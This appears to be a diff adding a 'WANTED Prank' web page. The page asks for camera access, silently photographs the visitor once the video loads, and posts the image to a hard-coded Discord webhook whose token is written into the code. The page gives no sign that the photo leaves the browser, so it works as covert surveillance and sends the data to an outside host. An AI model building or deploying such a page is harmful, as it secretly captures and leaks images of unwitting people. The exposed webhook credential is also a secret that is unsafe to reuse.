@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WANTED Prank</title>
+    <style>
+        body {
+            text-align: center;
+            background-color: black;
+            font-family: 'Courier New', Courier, monospace;
+            color: red;
+        }
+        .wanted-container {
+            border: 5px solid red;
+            width: 300px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: black;
+            box-shadow: 0 0 20px red;
+        }
+        h1 {
+            font-size: 30px;
+            color: red;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px red;
+        }
+        video, canvas {
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="wanted-container">
+        <h1>WANTED</h1>
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <img id="captured-image" style="display:none; width: 100%;"/>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const capturedImage = document.getElementById('captured-image');
+        const ctx = canvas.getContext('2d');
+        const webhookURL = "https://discord.com/api/webhooks/1272368740352393238/By246rTw4BRF5la0Xwy5YgMQVn_czwjVbLq3Gprq_EHtlWqGetQ6rGOdD1wltofZ_Kk0";
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.addEventListener('loadeddata', () => {
+                    captureAndSend();
+                });
+            })
+            .catch(err => {
+                console.error("Camera access denied", err);
+            });
+
+        function captureAndSend() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            capturedImage.src = imageData;
+            capturedImage.style.display = 'block';
+            video.style.display = 'none';
+            sendToDiscord(imageData);
+        }
+
+        function sendToDiscord(imageData) {
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "Wanted Bot",
+                    avatar_url: "https://i.imgur.com/AfFp7pu.png",
+                    content: "🚨 WANTED PERSON DETECTED! 🚨",
+                    embeds: [{
+                        title: "Captured Image",
+                        image: { url: imageData }
+                    }]
+                })
+            }).catch(error => console.error("Error sending image to Discord:", error));
+        }
+    </script>
+</body>
+</html>
